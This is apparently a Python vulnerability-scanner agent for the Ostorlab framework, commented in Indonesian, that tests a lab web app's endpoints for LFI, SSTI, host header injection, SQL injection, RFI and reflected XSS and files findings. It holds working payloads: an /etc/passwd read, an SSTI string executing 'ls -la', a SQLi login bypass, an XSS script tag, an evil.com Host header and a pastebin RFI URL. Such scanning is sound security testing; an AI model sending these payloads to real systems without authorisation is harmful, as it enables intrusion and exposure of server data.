import requests
from ostorlab.agent import agent
from ostorlab.agent import definitions as agent_definitions
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from ostorlab.runtimes import definitions as runtime_definitions
from ostorlab.agent.message import message as m
from ostorlab.agent.kb import kb
import logging

logger = logging.getLogger(__name__)

class MultiVulnAgent(agent.Agent, agent_report_vulnerability_mixin.AgentReportVulnMixin):
    def __init__(self, agent_definition, agent_settings):
        super().__init__(agent_definition, agent_settings)

    def start(self) -> None:
        """
        Metode start dipanggil saat agen dijalankan.
        """
    
    def process(self, message: m.Message) -> None:
        """
        Metode process, awal scan agen.
        """
        target_url = message.data.get('url','')

        logger.info(f"✅ Memulai pemindaian pada target: {target_url}")


        self.scan_lfi(target_url)
        self.scan_ssti(target_url)
        self.scan_hhi(target_url)
        self.scan_sqli(target_url)
        self.scan_rfi(target_url)
        self.scan_xss(target_url)

    def scan_lfi(self, target_url: str) -> None:
        """
        Memindai kerentanan Local File Inclusion (LFI).
        """
        endpoint = "/lfivuln"  # Endpoint yang akan diuji
        url = f"{target_url}{endpoint}"

        # Payload LFI untuk mencoba membaca /etc/passwd
        payloads = [
            "/etc/passwd",
        ]

        for payload in payloads:
            data = {"filename": payload}
            try:
                # Kirim request POST dengan payload
                response = requests.post(url, json=data, timeout=5)
                
                # Periksa apakah respons mengandung indikasi /etc/passwd
                if "root:" in response.text:

                    location = agent_report_vulnerability_mixin.VulnerabilityLocation(
                        metadata=[{"type": "URL", "value": target_url}]
                    )
                    # Memeriksa dan mengambil deskripsi dari lokasi kerentanannya
                    self.report_vulnerability(
                        entry=kb.Entry(
                            title="Local File Inclusion (LFI) Vulnerability (Injection - OWASP A03:2021)",
                            short_description=f"Input yang tidak tersanitasi, menghasilkan kerentanan LFI (Local File Inclusion)",
                            description=f"Input yang tidak disanitasi pada parameter filename, mengakibatkan terjadinya kerentanan LFI. Hal itu ditunjukan ketika Payload {payload} berhasil membaca file sistem. Respons: {response.text}",
                            recommendation='Lakukan validasi dan sanitasi pada input filename.',
                            references={},
                            risk_rating='HIGH',
                            security_issue=True,
                            privacy_issue=True,
                            has_public_exploit=True,
                            targeted_by_malware=False,
                            targeted_by_ransomware=False,
                            targeted_by_nation_state=False,
                        ),
                        technical_detail=f"Input yang tidak disanitasi pada parameter filenemae, mengakibatkan terjadinya kerentanan LFI. Hal itu ditunjukan ketika Payload {payload} berhasil membaca file sistem. Respons: {response.text}",
                        risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH
                    )

            except requests.exceptions.RequestException as e:
                logger.error(f"Gagal mengirim request ke {url}: {e}")

    def scan_ssti(self, target_url: str) -> None:
        """
        Memindai kerentanan Server-Side Template Injection (SSTI).
        """
        endpoint = "/sstivuln"  # Endpoint yang akan diuji
        url = f"{target_url}{endpoint}"

        # Payload SSTI untuk mencoba mengeksekusi kode
        payloads = [
            "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}",
        ]

        for payload in payloads:
            data = {"mathexp": payload}
            try:
                # Kirim request POST dengan payload SSTI
                response = requests.post(url, json=data, timeout=5)
                
                # Periksa apakah respons mengandung indikasi SSTI
                if "bin" in response.text or "root:" in response.text:

                    location = agent_report_vulnerability_mixin.VulnerabilityLocation(
                        metadata=[{"type": "URL", "value": target_url}]
                    )
                    # Memeriksa dan mengambil deskripsi dari lokasi kerentanannya
                    self.report_vulnerability(
                        entry=kb.Entry(
                            title="Server-Side Template Injection (SSTI) Vulnerability (Injection - OWASP A03:2021)",
                            short_description=f"Input yang tidak tersanitasi, menghasilkan kerentanan SSTI (Server Side Template Injection)",
                            description=f"Input yang tidak disanitasi pada parameter mathexp, mengakibatkan terjadinya kerentanan SSTI hingga terjadi RCE (Remote Command Execution). Hal itu ditunjukan ketika Payload {payload} berhasil menampilkan list file pada server. Respons: {response.text}",
                            recommendation='Lakukan validasi dan sanitasi pada input mathexp.',
                            references={},
                            risk_rating='HIGH',
                            security_issue=True,
                            privacy_issue=True,
                            has_public_exploit=True,
                            targeted_by_malware=False,
                            targeted_by_ransomware=False,
                            targeted_by_nation_state=False,
                        ),
                        technical_detail=f"Input yang tidak disanitasi pada parameter mathexp, mengakibatkan terjadinya kerentanan SSTI hingga terjadi RCE (Remote Command Execution). Hal itu ditunjukan ketika Payload {payload} berhasil menampilkan list file pada server. Respons: {response.text}",
                        risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH,
                        #vulnerability_location=location  # Menentukan rating risiko
                    )
            except requests.exceptions.RequestException as e:
                logger.error(f"Gagal mengirim request ke {url}: {e}")

    def scan_hhi(self, target_url: str) -> None:
        """
        Memindai kerentanan Host Header Injection (HHI).
        """
        endpoint = "/hhivuln"  # Endpoint yang akan diuji
        url = f"{target_url}{endpoint}"

        # Payload Host Header Injection
        payloads = [
            "evil.com",
        ]

        for payload in payloads:
            headers = {"Host": payload}
            data = {"email": "test@example.com"}
            try:
                # Kirim request POST dengan header Host yang dimodifikasi
                response = requests.post(url, json=data, headers=headers, timeout=5)
                
                # Periksa apakah respons mengandung payload
                if payload in response.text:

                    location = agent_report_vulnerability_mixin.VulnerabilityLocation(
                        metadata=[{"type": "URL", "value": target_url}]
                    )
                    # Memeriksa dan mengambil deskripsi dari lokasi kerentanannya
                    self.report_vulnerability(
                        entry=kb.Entry(
                            title="Host Header Injection (Security Missconfiguration - OWASP A05:2021)",
                            short_description=f"Header request ditampilkan pada respon, sehingga terjadi Host Header Injection.",
                            description=f"Header request ditampilkan pada respon, sehingga terjadi Host Header Injection. Hal itu dibuktikan ketika attacker melakukan modifikasi header host menjadi {payload}, lalu server menampilkan hasil dari nilai header host. Respons: {response.text}",
                            recommendation='Konfigurasi kan ulang server, batasi header host.',
                            references={},
                            risk_rating='MEDIUM',
                            security_issue=True,
                            privacy_issue=False,
                            has_public_exploit=True,
                            targeted_by_malware=False,
                            targeted_by_ransomware=False,
                            targeted_by_nation_state=False,
                        ),
                        technical_detail=f"Header request ditampilkan pada respon, sehingga terjadi Host Header Injection. Hal itu dibuktikan ketika attacker melakukan modifikasi header host menjadi {payload}, lalu server menampilkan hasil dari nilai header host. Respons: {response.text}",
                        risk_rating=agent_report_vulnerability_mixin.RiskRating.MEDIUM,
                        #vulnerability_location=location  # Menentukan rating risiko
                    )
            except requests.exceptions.RequestException as e:
                logger.error(f"Gagal mengirim request ke {url}: {e}")

    def scan_sqli(self, target_url: str) -> None:
        """
        Memindai kerentanan SQL Injection (SQLi).
        """
        endpoint = "/sqlivuln"  # Endpoint yang akan diuji
        url = f"{target_url}{endpoint}"

        # Payload SQL Injection
        payloads = [
            "' OR '1'='1' --",
        ]

        for payload in payloads:
            data = {"username": payload, "password": "test"}
            try:
                # Kirim request POST dengan payload SQLi
                response = requests.post(url, json=data, timeout=5)

                # Parsing respons JSON
                try:
                    response_data = response.json()
                except json.JSONDecodeError:
                    logger.warning(f"Respons bukan JSON: {response.text}")
                    continue

                # Memeriksa apakah respons mengandung data username/password
                if "msg" in response_data and isinstance(response_data["msg"], str):
                    extracted_data = response_data["msg"]
                    
                    # Mengecek apakah ada data tuple dalam respons
                    if "[" in extracted_data and "]" in extracted_data:
                        logger.info(f"Potensi SQLi ditemukan pada {url}: {extracted_data}")

                        # Lokasi kerentanan
                        location = agent_report_vulnerability_mixin.VulnerabilityLocation(
                            metadata=[{"type": "URL", "value": target_url}]
                        )

                        # Melaporkan kerentanan
                        self.report_vulnerability(
                            entry=kb.Entry(
                                title="SQL Injection (Injection - OWASP A03:2021)",
                                short_description="Aplikasi rentan terhadap SQL Injection.",
                                description=f"Aplikasi tidak melakukan validasi input dengan benar pada parameter username. Ketika payload `{payload}` dikirim, server mengembalikan data sensitif: {extracted_data}.",
                                recommendation="Gunakan parameterized queries (prepared statements) untuk menghindari SQL Injection. Jangan pernah menggabungkan input pengguna langsung ke dalam query SQL.",
                                references={},
                                risk_rating='HIGH',
                                security_issue=True,
                                privacy_issue=True,
                                has_public_exploit=True,
                                targeted_by_malware=False,
                                targeted_by_ransomware=False,
                                targeted_by_nation_state=False,
                            ),
                            technical_detail=f"SQL Injection ditemukan pada endpoint {url} menggunakan payload {payload}. Server merespons dengan data: {extracted_data}.",
                            risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH,
                            #vulnerability_location=location
                        )
            except requests.exceptions.RequestException as e:
                logger.error(f"Gagal mengirim request ke {url}: {e}")

    def scan_rfi(self, target_url: str) -> None:
        """
        Memindai kerentanan Remote File Inclusion (RFI).
        """
        endpoint = "/rfivuln"  # Endpoint yang akan diuji
        url = f"{target_url}{endpoint}"

        # Payload RFI
        payloads = [
            "https://pastebin.com/raw/hj8Xr28w",
        ]

        for payload in payloads:
            data = {"imagelink": payload}
            try:
                # Kirim request POST dengan payload RFI
                response = requests.post(url, json=data, timeout=5)
                
                # Periksa apakah respons mengandung indikasi RFI
                if "response," in response.text:
                    location = agent_report_vulnerability_mixin.VulnerabilityLocation(
                        metadata=[{"type": "URL", "value": target_url}]
                    )
                    # Memeriksa dan mengambil deskripsi dari lokasi kerentanannya
                    self.report_vulnerability(
                        entry=kb.Entry(
                            title="Remote File Inclusion (Injection - OWASP A05:2021)",
                            short_description=f"Input yang tidak tersanitasi, menghasilkan kerentanan RFI (Remote File Inclusion)",
                            description=f"Input yang tidak disanitasi pada parameter imagelink, mengakibatkan terjadinya kerentanan RFI yang dapat dimanfaatkan attacker untuk menaruh file dari luar server masuk ke dalam server. Hal itu ditunjukan ketika Payload {payload} berhasil menampilkan isi file walaupun file berada diluar server. Respons: {response.text}",
                            recommendation='Lakukan validasi dan sanitasi pada input imagelink.',
                            references={},
                            risk_rating='MEDIUM',
                            security_issue=True,
                            privacy_issue=False,
                            has_public_exploit=True,
                            targeted_by_malware=False,
                            targeted_by_ransomware=False,
                            targeted_by_nation_state=False,
                        ),
                        technical_detail=f"Input yang tidak disanitasi pada parameter imagelink, mengakibatkan terjadinya kerentanan RFI yang dapat dimanfaatkan attacker untuk menaruh file dari luar server masuk ke dalam server. Hal itu ditunjukan ketika Payload {payload} berhasil menampilkan isi file walaupun file berada diluar server. Respons: {response.text}",
                        risk_rating=agent_report_vulnerability_mixin.RiskRating.MEDIUM,
                        #vulnerability_location=location  # Menentukan rating risiko
                    )
            except requests.exceptions.RequestException as e:
                logger.error(f"Gagal mengirim request ke {url}: {e}")

    def scan_xss(self, target_url: str) -> None:
        """
        Memindai kerentanan Reflected XSS.
        """
        endpoint = "/xssreflected"  # Endpoint yang akan diuji
        url = f"{target_url}{endpoint}"

        # Payload XSS
        payloads = [
            "<script>alert('XSS');</script>",
        ]

        for payload in payloads:
            data = {"username": payload}
            try:
                # Kirim request POST dengan payload XSS
                response = requests.post(url, json=data, timeout=5)
                
                # Periksa apakah payload tercermin di respons
                if payload in response.text:
                    # Memeriksa dan mengambil deskripsi dari lokasi kerentanannya
                    self.report_vulnerability(
                        entry=kb.Entry(
                            title="Cross-Site Scripting (Injection - OWASP A05:2021)",
                            short_description=f"Input yang tidak tersanitasi, menghasilkan kerentanan XSS (Cross-Site Scripting) Reflected",
                            description=f"Input yang tidak disanitasi pada parameter username, mengakibatkan terjadinya kerentanan XSS Reflected. Hal itu ditunjukan ketika Payload {payload} berhasil dikembalikan tanpa ada sanitasi output. Respons: {response.text}",
                            recommendation='Lakukan validasi dan sanitasi pada input maupun output username.',
                            references={},
                            risk_rating='MEDIUM',
                            security_issue=True,
                            privacy_issue=False,
                            has_public_exploit=True,
                            targeted_by_malware=False,
                            targeted_by_ransomware=False,
                            targeted_by_nation_state=False,
                        ),
                        technical_detail=f"Input yang tidak disanitasi pada parameter username, mengakibatkan terjadinya kerentanan XSS Reflected. Hal itu ditunjukan ketika Payload {payload} berhasil dikembalikan tanpa ada sanitasi output. Respons: {response.text}",
                        risk_rating=agent_report_vulnerability_mixin.RiskRating.MEDIUM,
                        #vulnerability_location=location  # Menentukan rating risiko
                    )
            except requests.exceptions.RequestException as e:
                logger.error(f"Gagal mengirim request ke {url}: {e}")


if __name__ == "__main__":
    MultiVulnAgent.main()